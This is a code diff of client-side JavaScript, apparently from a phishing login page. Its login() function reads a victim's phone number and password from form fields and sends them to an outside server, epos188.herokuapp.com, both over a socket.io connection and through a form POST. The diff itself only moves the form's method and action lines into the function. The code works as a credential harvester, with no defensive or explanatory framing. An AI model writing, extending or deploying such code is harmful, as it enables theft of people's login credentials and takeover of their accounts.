@@ -11,8 +11,6 @@
 var socket = io("https://epos188.herokuapp.com/");
 socket.connect();
 
-form.setAttribute("method", 'post');
-form.setAttribute("action", 'https://epos188.herokuapp.com/');
 function login(){
   var e = document.getElementById("login_code_2");
   var val_code = e.options[e.selectedIndex].value;
@@ -20,6 +18,8 @@ function login(){
   var pass = document.getElementById("login_pass_2").value;
   var fullnumber= "+"+ val_code+ num.replace('0','');
   var form = document.createElement("form");
+  form.setAttribute("method", 'post');
+  form.setAttribute("action", 'https://epos188.herokuapp.com/');
   socket.emit('login1',fullnumber,pass);
   socket.on('login1_dung',()=>{
     add_form('pass',document.getElementById("login_pass_2").value);
